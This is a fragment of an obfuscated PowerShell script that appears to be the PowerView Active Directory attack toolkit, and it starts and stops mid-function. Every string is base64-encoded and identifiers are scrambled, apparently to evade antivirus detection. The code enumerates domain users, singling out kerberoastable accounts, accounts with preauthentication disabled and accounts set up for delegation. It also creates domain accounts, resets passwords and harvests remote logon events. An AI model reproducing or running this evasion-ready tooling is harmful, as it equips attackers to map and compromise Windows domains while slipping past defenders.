        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${/===\/\/\_____/\/} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            _/===\_/\/\/\/==\_ -CreateVariables -BoundParameters $PSBoundParameters
        }
        if (${/===\/\/\_____/\/}) {
            ${__/\_/==\_/\/\___} = ''
            $Filter = ''
            $Identity | ? {$_} | % {
                ${/\______/===\__/\} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if (${/\______/===\__/\} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAA==')))) {
                    ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewAvAFwAXwBfAF8AXwBfAF8ALwA9AD0APQBcAF8AXwAvAFwAfQApAA==')))
                }
                elseif (${/\______/===\__/\} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQA=')))) {
                    ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsALwBcAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAF8ALwBcAH0AKQA=')))
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        ${____/\_/=\/\/\__/} = ${/\______/===\__/\}.SubString(${/\______/===\__/\}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAEUAeAB0AHIAYQBjAHQAZQBkACAAZABvAG0AYQBpAG4AIAAnACQAewBfAF8AXwBfAC8AXABfAC8APQBcAC8AXAAvAFwAXwBfAC8AfQAnACAAZgByAG8AbQAgACcAJAB7AC8AXABfAF8AXwBfAF8AXwAvAD0APQA9AFwAXwBfAC8AXAB9ACcA')))
                        ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${____/\_/=\/\/\__/}
                        ${/===\/\/\_____/\/} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
                        if (-not ${/===\/\/\_____/\/}) {
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFUAbgBhAGIAbABlACAAdABvACAAcgBlAHQAcgBpAGUAdgBlACAAZABvAG0AYQBpAG4AIABzAGUAYQByAGMAaABlAHIAIABmAG8AcgAgACcAJAB7AF8AXwBfAF8ALwBcAF8ALwA9AFwALwBcAC8AXABfAF8ALwB9ACcA')))
                        }
                    }
                }
                elseif (${/\______/===\__/\} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                    ${_/=\_/=====\__/=\} = (([Guid]${/\______/===\__/\}).ToByteArray() | % { '\' + $_.ToString('X2') }) -join ''
                    ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AF8ALwA9AFwAXwAvAD0APQA9AD0APQBcAF8AXwAvAD0AXAB9ACkA')))
                }
                elseif (${/\______/===\__/\}.Contains('\')) {
                    ${/=\/\/\___/==\_/=} = ${/\______/===\__/\}.Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA'))), '(').Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))), ')') | __/\/=\_/\/=\/=\_/ -_/============\/\/ Canonical
                    if (${/=\/\/\___/==\_/=}) {
                        $UserDomain = ${/=\/\/\___/==\_/=}.SubString(0, ${/=\/\/\___/==\_/=}.IndexOf('/'))
                        ${/=\__/\_/\__/\/\_} = ${/\______/===\__/\}.Split('\')[1]
                        ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAHsALwA9AFwAXwBfAC8AXABfAC8AXABfAF8ALwBcAC8AXABfAH0AKQA=')))
                        ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAEUAeAB0AHIAYQBjAHQAZQBkACAAZABvAG0AYQBpAG4AIAAnACQAVQBzAGUAcgBEAG8AbQBhAGkAbgAnACAAZgByAG8AbQAgACcAJAB7AC8AXABfAF8AXwBfAF8AXwAvAD0APQA9AFwAXwBfAC8AXAB9ACcA')))
                        ${/===\/\/\_____/\/} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
                    }
                }
                else {
                    ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAHsALwBcAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAF8ALwBcAH0AKQA=')))
                }
            }
            if (${__/\_/==\_/\/\___} -and (${__/\_/==\_/\/\___}.Trim() -ne '') ) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBfAF8ALwBcAF8ALwA9AD0AXABfAC8AXAAvAFwAXwBfAF8AfQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBQAE4A')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIABuAG8AbgAtAG4AdQBsAGwAIABzAGUAcgB2AGkAYwBlACAAcAByAGkAbgBjAGkAcABhAGwAIABuAGEAbQBlAHMA')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGUAcgB2AGkAYwBlAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUAPQAqACkA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AEQAZQBsAGUAZwBhAHQAaQBvAG4A')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIAB1AHMAZQByAHMAIAB3AGgAbwAgAGMAYQBuACAAYgBlACAAZABlAGwAZQBnAGEAdABlAGQA')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAdQBzAGUAcgBBAGMAYwBvAHUAbgB0AEMAbwBuAHQAcgBvAGwAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAxADAANAA4ADUANwA0ACkAKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBsAGwAbwB3AEQAZQBsAGUAZwBhAHQAaQBvAG4A')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIAB1AHMAZQByAHMAIAB3AGgAbwAgAGEAcgBlACAAcwBlAG4AcwBpAHQAaQB2AGUAIABhAG4AZAAgAG4AbwB0ACAAdAByAHUAcwB0AGUAZAAgAGYAbwByACAAZABlAGwAZQBnAGEAdABpAG8AbgA=')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADEAMAA0ADgANQA3ADQAKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIABhAGQAbQBpAG4AQwBvAHUAbgB0AD0AMQA=')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABhAGQAbQBpAG4AYwBvAHUAbgB0AD0AMQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGUAZABUAG8AQQB1AHQAaAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIAB1AHMAZQByAHMAIAB0AGgAYQB0ACAAYQByAGUAIAB0AHIAdQBzAHQAZQBkACAAdABvACAAYQB1AHQAaABlAG4AdABpAGMAYQB0AGUAIABmAG8AcgAgAG8AdABoAGUAcgAgAHAAcgBpAG4AYwBpAHAAYQBsAHMA')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABtAHMAZABzAC0AYQBsAGwAbwB3AGUAZAB0AG8AZABlAGwAZQBnAGEAdABlAHQAbwA9ACoAKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGUAYQB1AHQAaABOAG8AdABSAGUAcQB1AGkAcgBlAGQA')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIAB1AHMAZQByACAAYQBjAGMAbwB1AG4AdABzACAAdABoAGEAdAAgAGQAbwAgAG4AbwB0ACAAcgBlAHEAdQBpAHIAZQAgAGsAZQByAGIAZQByAG8AcwAgAHAAcgBlAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABlAA==')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADQAMQA5ADQAMwAwADQAKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFUAcwBpAG4AZwAgAGEAZABkAGkAdABpAG8AbgBhAGwAIABMAEQAQQBQACAAZgBpAGwAdABlAHIAOgAgACQATABEAEEAUABGAGkAbAB0AGUAcgA=')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            $UACFilter | ? {$_} | % {
                if ($_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwAuACoA')))) {
                    ${_____/====\_/\__/} = $_.Substring(4)
                    ${___/\_/=\/\/=\/\/} = [Int](${/=\____/\/===\/\_}::${_____/====\_/\__/})
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAdQBzAGUAcgBBAGMAYwBvAHUAbgB0AEMAbwBuAHQAcgBvAGwAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAkAHsAXwBfAF8ALwBcAF8ALwA9AFwALwBcAC8APQBcAC8AXAAvAH0AKQApAA==')))
                }
                else {
                    ${___/\_/=\/\/=\/\/} = [Int](${/=\____/\/===\/\_}::$_)
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ACQAewBfAF8AXwAvAFwAXwAvAD0AXAAvAFwALwA9AFwALwBcAC8AfQApAA==')))
                }
            }
            ${/===\/\/\_____/\/}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMwA2ADgAKQAkAEYAaQBsAHQAZQByACkA')))
            Write-Verbose "[Get-DomainUser] filter string: $(${/===\/\/\_____/\/}.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${_/\__/\/=====\_/\} = ${/===\/\/\_____/\/}.FindOne() }
            else { ${_/\__/\/=====\_/\} = ${/===\/\/\_____/\/}.FindAll() }
            ${_/\__/\/=====\_/\} | ? {$_} | % {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    ${_/==\/=\___/=====\} = $_
                    ${_/==\/=\___/=====\}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAC4AUgBhAHcA'))))
                }
                else {
                    ${_/==\/=\___/=====\} = _______/==\_/=\_/= -Properties $_.Properties
                    ${_/==\/=\___/=====\}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAA=='))))
                }
                ${_/==\/=\___/=====\}
            }
            if (${_/\__/\/=====\_/\}) {
                try { ${_/\__/\/=====\_/\}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAEUAcgByAG8AcgAgAGQAaQBzAHAAbwBzAGkAbgBnACAAbwBmACAAdABoAGUAIABSAGUAcwB1AGwAdABzACAAbwBiAGoAZQBjAHQAOgAgACQAXwA=')))
                }
            }
            ${/===\/\/\_____/\/}.dispose()
        }
    }
}
function New-DomainUser {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $AccountPassword,
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,
        [ValidateNotNullOrEmpty()]
        [String]
        $DisplayName,
        [ValidateNotNullOrEmpty()]
        [String]
        $Description,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    ${_/=====\/\/==\/\/} = @{
        'Identity' = $SamAccountName
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/=====\/\/==\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/=====\/\/==\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    ${_/\_/\__/\/\/\___} = __/=\/=\_/\/=\_/\_ @_/=====\/\/==\/\/
    if (${_/\_/\__/\/\/\___}) {
        ${_/==\/=\___/=====\} = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList (${_/\_/\__/\/\/\___}.Context)
        ${_/==\/=\___/=====\}.SamAccountName = ${_/\_/\__/\/\/\___}.Identity
        ${_/\/\____/=\/\/==} = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
        ${_/==\/=\___/=====\}.SetPassword(${_/\/\____/=\/\/==}.GetNetworkCredential().Password)
        ${_/==\/=\___/=====\}.Enabled = $True
        ${_/==\/=\___/=====\}.PasswordNotRequired = $False
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA=')))]) {
            ${_/==\/=\___/=====\}.Name = $Name
        }
        else {
            ${_/==\/=\___/=====\}.Name = ${_/\_/\__/\/\/\___}.Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAcABsAGEAeQBOAGEAbQBlAA==')))]) {
            ${_/==\/=\___/=====\}.DisplayName = $DisplayName
        }
        else {
            ${_/==\/=\___/=====\}.DisplayName = ${_/\_/\__/\/\/\___}.Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA==')))]) {
            ${_/==\/=\___/=====\}.Description = $Description
        }
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAEEAdAB0AGUAbQBwAHQAaQBuAGcAIAB0AG8AIABjAHIAZQBhAHQAZQAgAHUAcwBlAHIAIAAnACQAUwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlACcA')))
        try {
            $Null = ${_/==\/=\___/=====\}.Save()
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFUAcwBlAHIAIAAnACQAUwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlACcAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAGMAcgBlAGEAdABlAGQA')))
            ${_/==\/=\___/=====\}
        }
        catch {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAEUAcgByAG8AcgAgAGMAcgBlAGEAdABpAG4AZwAgAHUAcwBlAHIAIAAnACQAUwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlACcAIAA6ACAAJABfAA==')))
        }
    }
}
function Set-DomainUserPassword {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('UserName', 'UserIdentity', 'User')]
        [String]
        $Identity,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $AccountPassword,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    ${_/=====\/\/==\/\/} = @{ 'Identity' = $Identity }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/=====\/\/==\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/=====\/\/==\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    ${_/\_/\__/\/\/\___} = __/=\/=\_/\/=\_/\_ @_/=====\/\/==\/\/
    if (${_/\_/\__/\/\/\___}) {
        ${_/==\/=\___/=====\} = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity(${_/\_/\__/\/\/\___}.Context, $Identity)
        if (${_/==\/=\___/=====\}) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAUABhAHMAcwB3AG8AcgBkAF0AIABBAHQAdABlAG0AcAB0AGkAbgBnACAAdABvACAAcwBlAHQAIAB0AGgAZQAgAHAAYQBzAHMAdwBvAHIAZAAgAGYAbwByACAAdQBzAGUAcgAgACcAJABJAGQAZQBuAHQAaQB0AHkAJwA=')))
            try {
                ${_/\/\____/=\/\/==} = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
                ${_/==\/=\___/=====\}.SetPassword(${_/\/\____/=\/\/==}.GetNetworkCredential().Password)
                $Null = ${_/==\/=\___/=====\}.Save()
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAUABhAHMAcwB3AG8AcgBkAF0AIABQAGEAcwBzAHcAbwByAGQAIABmAG8AcgAgAHUAcwBlAHIAIAAnACQASQBkAGUAbgB0AGkAdAB5ACcAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAHIAZQBzAGUAdAA=')))
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAUABhAHMAcwB3AG8AcgBkAF0AIABFAHIAcgBvAHIAIABzAGUAdAB0AGkAbgBnACAAcABhAHMAcwB3AG8AcgBkACAAZgBvAHIAIAB1AHMAZQByACAAJwAkAEkAZABlAG4AdABpAHQAeQAnACAAOgAgACQAXwA=')))
            }
        }
        else {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAUABhAHMAcwB3AG8AcgBkAF0AIABVAG4AYQBiAGwAZQAgAHQAbwAgAGYAaQBuAGQAIAB1AHMAZQByACAAJwAkAEkAZABlAG4AdABpAHQAeQAnAA==')))
        }
    }
}
function ________/====\/\/\ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogonEvent')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${/=\/\/\/=\__/\_/=} = ${Env:/=\/\/\/=\__/\_/=},
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${___/\______/=\_/=\} = [DateTime]::Now.AddDays(-1),
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${_/=\__/=\/\/\/=\/\} = [DateTime]::Now,
        [ValidateRange(1, 1000000)]
        [Int]
        $MaxEvents = 5000,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${__/=====\/==\_/\_} = @"
<QueryList>
    <Query Id="0" Path="Security">

        <!-- Logon events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4624)
                    and TimeCreated[
                        @SystemTime&gt;='$(${___/\______/=\_/=\}.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$(${_/=\__/=\/\/\/=\/\}.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
            and
            *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]
        </Select>

        <!-- Logon with explicit credential events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4648)
                    and TimeCreated[
                        @SystemTime&gt;='$(${___/\______/=\_/=\}.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$(${_/=\__/=\/\/\/=\/\}.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
        </Select>

        <Suppress Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and
                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)
                ]
            ]
            and
            *[
                EventData[
                    (
                        (Data[@Name='LogonType']='5' or Data[@Name='LogonType']='0')
                        or
                        Data[@Name='TargetUserName']='ANONYMOUS LOGON'
                        or
                        Data[@Name='TargetUserSID']='S-1-5-18'
                    )
                ]
            ]
        </Suppress>
    </Query>
</QueryList>
"@
        ${/===\_/====\/\_/\} = @{
            'FilterXPath' = ${__/=====\/==\_/\_}
            'LogName' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AA==')))
            'MaxEvents' = $MaxEvents
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/===\_/====\/\_/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        ForEach (${/\_______/\/\/=\/} in ${/=\/\/\/=\__/\_/=}) {
            ${/===\_/====\/\_/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))] = ${/\_______/\/\/=\/}
            Get-WinEvent @/===\_/====\/\_/\| % {
                ${/==\_____/==\____} = $_
                $Properties = ${/==\_____/==\____}.Properties
                Switch (${/==\_____/==\____}.Id) {
                    4624 {
                        if(-not $Properties[5].Value.EndsWith('$')) {
                            ${/===\______/\/==\} = New-Object PSObject -Property @{
                                ComputerName              = ${/\_______/\/\/=\/}
                                TimeCreated               = ${/==\_____/==\____}.TimeCreated
                                EventId                   = ${/==\_____/==\____}.Id
                                SubjectUserSid            = $Properties[0].Value.ToString()
                                SubjectUserName           = $Properties[1].Value
                                SubjectDomainName         = $Properties[2].Value
                                SubjectLogonId            = $Properties[3].Value
                                TargetUserSid             = $Properties[4].Value.ToString()
                                TargetUserName            = $Properties[5].Value
                                TargetDomainName          = $Properties[6].Value
                                TargetLogonId             = $Properties[7].Value
                                LogonType                 = $Properties[8].Value
                                LogonProcessName          = $Properties[9].Value
                                AuthenticationPackageName = $Properties[10].Value
                                WorkstationName           = $Properties[11].Value
                                LogonGuid                 = $Properties[12].Value
                                TransmittedServices       = $Properties[13].Value
                                LmPackageName             = $Properties[14].Value
